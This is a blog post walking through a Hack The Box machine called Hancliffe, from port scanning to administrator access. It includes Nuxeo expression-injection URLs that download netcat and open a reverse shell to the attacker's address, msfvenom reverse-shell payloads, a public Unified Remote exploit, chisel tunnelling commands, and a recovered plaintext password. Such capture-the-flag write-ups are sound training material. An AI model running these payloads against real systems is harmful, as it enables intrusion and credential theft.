---
layout: post
title: "Hancliffe"
date: 2022-03-07
categories: [HTB, machine-hard-htb]
image: /assets/img/Hancliffe-logo-HTB.png
---
## Hackthebox - Hancliffe
<!-- <img src='/assets/img/Hancliffe-logo-HTB.png' alt='Hancliffe logo'> -->
# Enumeration
Starting off with a nmap scan:

```nmap -sC -sV 10.10.11.115 ```
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-07 19:38 EAT
Nmap scan report for 10.10.11.115
Host is up (0.18s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.21.0
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.21.0
8000/tcp open  http    nginx 1.21.0
|_http-title: HashPass | Open Source Stateless Password Manager
|_http-server-header: nginx/1.21.0
9999/tcp open  abyss?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
|     Welcome Brankas Application.
|     Username: Password:
|   NULL:
|     Welcome Brankas Application.
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=3/7%Time=62263505%P=x86_64-pc-linux-gnu%r(NUL
SF:L,27,"Welcome\x20Brankas\x20Application\.\nUsername:\x20")%r(GetRequest
SF:,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%
SF:r(HTTPOptions,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Pas
SF:sword:\x20")%r(FourOhFourRequest,31,"Welcome\x20Brankas\x20Application\
SF:.\nUsername:\x20Password:\x20")%r(JavaRMI,31,"Welcome\x20Brankas\x20App
SF:lication\.\nUsername:\x20Password:\x20")%r(GenericLines,31,"Welcome\x20
SF:Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(RTSPRequest,31
SF:,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(R
SF:PCCheck,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:
SF:\x20")%r(DNSVersionBindReqTCP,31,"Welcome\x20Brankas\x20Application\.\n
SF:Username:\x20Password:\x20")%r(DNSStatusRequestTCP,31,"Welcome\x20Brank
SF:as\x20Application\.\nUsername:\x20Password:\x20")%r(Help,31,"Welcome\x2
SF:0Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(SSLSessionReq
SF:,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%
SF:r(TerminalServerCookie,31,"Welcome\x20Brankas\x20Application\.\nUsernam
SF:e:\x20Password:\x20")%r(TLSSessionReq,31,"Welcome\x20Brankas\x20Applica
SF:tion\.\nUsername:\x20Password:\x20")%r(Kerberos,31,"Welcome\x20Brankas\
SF:x20Application\.\nUsername:\x20Password:\x20")%r(SMBProgNeg,31,"Welcome
SF:\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(X11Probe,3
SF:1,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(
SF:LPDString,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Passwor
SF:d:\x20")%r(LDAPSearchReq,31,"Welcome\x20Brankas\x20Application\.\nUsern
SF:ame:\x20Password:\x20")%r(LDAPBindReq,31,"Welcome\x20Brankas\x20Applica
SF:tion\.\nUsername:\x20Password:\x20")%r(SIPOptions,31,"Welcome\x20Branka
SF:s\x20Application\.\nUsername:\x20Password:\x20")%r(LANDesk-RC,31,"Welco
SF:me\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(Terminal
SF:Server,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\
SF:x20")%r(NCP,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Passw
SF:ord:\x20")%r(NotesRPC,31,"Welcome\x20Brankas\x20Application\.\nUsername
SF::\x20Password:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 179.51 seconds

```
We have 3 ports open which are 80,8000 and 9999

# port 80 Enumeration
Opening...

<img src='/assets/img/nginx_default_page_Hancliffe.png' alt='nginx default page'>

we have default page for nginx.
let us observe
Nothig at /robots.txt
Nothing at view-source
Nothing interest at headers

bruteforce files

<img src='/assets/img/gobuster-hancliffe-80.png' alt='gobuster port 80'>

Discovery /maintenance during bruteforce 
it look interest as it redirect to /nuxeo/Maintenance/.
We need to investigate it.You can use burpsuite but for this i will use curl command

<img src='/assets/img/curl_maintanance-hancliffe.png' alt='curl observe maintenance'>

So far nothing. then do some research and found that nuxeo is Content Management Platform for Modern Business Applications from the <a href="https://github.com/nuxeo/nuxeo" target="_blank" rel="noopener">github-repo</a>

After disovering that java-based application(nuxeo) is running behind nginx, we can try Orange Tsai at Blackhat 2018 in <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">Breaking Parser Logic: Take Your Path Normilzation Off and Pop 0days Out</a> as it was tomcat in nginx.
For tomcat on nginx, it was /foo;name=orange/bar/

For this, /..;/whitelist_here in which it will be used to bypass restriction. Read the article at page 44

Put it into test again by using curl command

<img src='/assets/img/discover_nxstartup-curl.png' alt='Discovery nxstart'>

You will see here ```GET /nuxeo/nxstartup.faces``` as being added during redirection.
Discover nxstartup.faces then testing again with new directory

<img src='/assets/img/discover-login-curl.png' alt='Discovery login'>

You will see here ```window.location = 'http://10.10.11.115/nuxeo/login.jsp';``` in body as it will redirect to login.jsp after performing curl command to ```http://10.10.11.115/maintenance/..;/nuxeo/nxstartup.faces```
But it bring 404 NOT FOUND then with this 

<img src='/assets/img/gobuster-vuln-hanclife.png' alt='gobuster on vuln'>

this ```http://10.10.11.115/maintenance/..;/login.jsp``` in which you can obtain after some bruteforce

Opening..

<img src='/assets/img/web-page-nuxeon-hanclife.png' alt='login page nuxeo'>

From above image, we can see the version from below right side as ```NUXEO PLATFORM   FT 10.2``` in which has vulnerability about Nuxeo Authentication Bypass Remote Code Execution (CVE-2018-16341)

Testing to see if it has vulnerability by maintenance/..;/login.jsp/pwn${999999999+1000000000}.xhtml

<img src='/assets/img/nuxeo-vuln-hancliffe.png' alt='nuxeo vuln'>

start web server in your pc with nc64.exe
then this like ```python3 -m http.server 80```
Uploading nc64.exe to server

```http://10.10.11.115/maintenance/..;/login.jsp/pwn/${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("powershell -c curl 10.10.14.138/nc64.exe -outfile \programdata\nc64.exe",null).waitFor()}.xhtml```

then nc -nvlp 1234

```http://10.10.11.115/maintenance/..;/login.jsp/pwn/${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("powershell -c \programdata\nc64.exe -e powershell 10.10.14.138 1234",null).waitFor()}.xhtml```

then we have a shell as svc-account

<img src='/assets/img/shell-as-svc_account.Hanclife.png' alt='shell as svc-account'>


read this <a href="https://adamtheautomator.com/netstat-port/" target="_blank" rel="noopener">blog show more explanation about netstat and powershell</a> in which we will use it

```
Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | Format-Table -Property LocalAddress,LocalPort,OwningProcess,ProcessName
```
the command above..

<img src='/assets/img/investigate-process-hanclife.png' alt='process'>

Googling for  <a href="https://www.file.net/process/remoteserverwin.exe.html" target="_blank" rel="noopener">RemoteServerWin.exe</a> shows it’s associated with the <a href="https://www.exploit-db.com/exploits/49587" target="_blank" rel="noopener">Unified Remote 3.9.0.2463</a>  

the script show that it connect TCP port 9512 but the problem come that the access is only inside so we need some kind
of tunneling so will use chisel- <a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener">repo</a> 

Setting up chisel
```
#windows
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz
gzip -d chisel_1.7.7_windows_amd64.gz
mv chisel_1.7.7_windows_amd64 chisel.exe
#linux
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
```
Uploading chisel.exe to server
first starting ```python3 -m http.server 80``` where chisel.exe exist
then transfer it to server.I will use ```iwr http://10.10.14.138/chisel.exe  -OutFile chisel.exe```

<img src='/assets/img/upload-chisel-hancliffe.png' alt='upload chisel'>

On your machine
```
└─$ ./chisel_1.7.7_linux_amd64 server -p 8000 --reverse                                                                                                              2 ⨯
2022/03/07 22:57:24 server: Reverse tunnelling enabled
2022/03/07 22:57:24 server: Fingerprint G3q9Hsq+VNERRHiQFJ2pla10CSrQF8N4fuqVN4DKUZI=
2022/03/07 22:57:24 server: Listening on http://0.0.0.0:8000
```
On client
```
PS C:\temp> .\chisel.exe client 10.10.14.138:8000 R:9512:127.0.0.1:9512
.\chisel.exe client 10.10.14.138:8000 R:9512:127.0.0.1:9512
2022/03/07 12:01:42 client: Connecting to ws://10.10.14.138:8000
2022/03/07 12:01:44 client: Connected (Latency 175.3638ms)
```

verify that we did tunnelling 

<img src='/assets/img/verfied-hanclife.png' alt='verified'>

first create payload as exploit needed it

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.138 LPORT=1235 -f exe -o rev.exe
```
then
open webserver where the payload can be reached
then

```
wget https://www.exploit-db.com/raw/49587
```
running it
```
└─$ python2 exploit.py 127.0.0.1 10.10.14.138 rev.exe                                                                                                                1 ⨯
[+] Connecting to target...
[+] Popping Start Menu
[+] Opening CMD
[+] *Super Fast Hacker Typing*
[+] Downloading Payload
[+] Done! Check listener?
```
Then we have a shell as clara
```
└─$ nc -nvlp 1235              
listening on [any] 1235 ...
connect to [10.10.14.138] from (UNKNOWN) [10.10.11.115] 54106
Microsoft Windows [Version 10.0.19043.1266]
(c) Microsoft Corporation. All rights reserved.

C:\Users\clara>whoami
whoami
hancliffe\clara

C:\Users\clara>
```


Transfer <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank" rel="noopener">winpeas</a> like we did in chisel

run it for privs

Found interest thing from winpeas result

<img src='/assets/img/winpeas-Hanclife.png' alt='winpeas result'>

```
͹ Showing saved credentials for Firefox                                                                                                                                  
     Url:           http://localhost:8000                                                                                                                                
     Username:      hancliffe.htb                                                                                                                                        
     Password:      #@H@ncLiff3D3velopm3ntM@st3rK3y*!  
```
Picture show password of clara and password used in Firefox (password manager) which is for development

Go to http://10.10.11.115:8000/ as we have what it take for us to generate password for development

<img src='/assets/img/generate-password-Hanclife.png' alt='password generate'>

we have password of development as ```AMl.q2DHp?2.C/V0kNFU```

Need to tunnelling port 5985 to login as development after start server like we did previously

<img src='/assets/img/5985-tunneling-Hancliffe.png' alt='tunnelling 5985'>

Getting shell as development

<img src='/assets/img/development-hancliffe.png' alt='development user'>

At time I was reaching here and didnot finish the box lol me.


# Root

Unintended

```
*Evil-WinRM* PS C:\ > mv \devapp \old
*Evil-WinRM* PS C:\ > mkdir \devapp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/10/2021   1:53 PM                devapp


*Evil-WinRM* PS C:\ > cp \old\restart.ps1 \devapp
*Evil-WinRM* PS C:\ > cd \devapp
```

create payload on your machine
```
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.138 LPORT=1237 -f exe -o exploit.exe
```
Listen using multi/handler
```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.14.138
lhost => 10.10.14.138
msf6 exploit(multi/handler) > set lport 1237
lport => 1237
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.138:1237

```
Uploading your exploit generated by msfconsole
```
*Evil-WinRM* PS C:\devapp> upload exploit.exe MyFirstApp.exe
Info: Uploading exploit.exe to C:\devapp\MyFirstApp.exe

```
After some time You will get a shell as administrator

<img src='/assets/img/root-Hancliffe.png' alt='root'>


Intended

look from those links to understand

<a href="https://www.youtube.com/watch?v=kA-bkftyyY0&t=3300s" target="_blank" rel="noopener">IPPSEC'S EXPLANATION</a>


<a href="https://www.youtube.com/watch?v=r4aaNt7f-lM" target="_blank" rel="noopener">OXDF'S EXPLANATION</a>
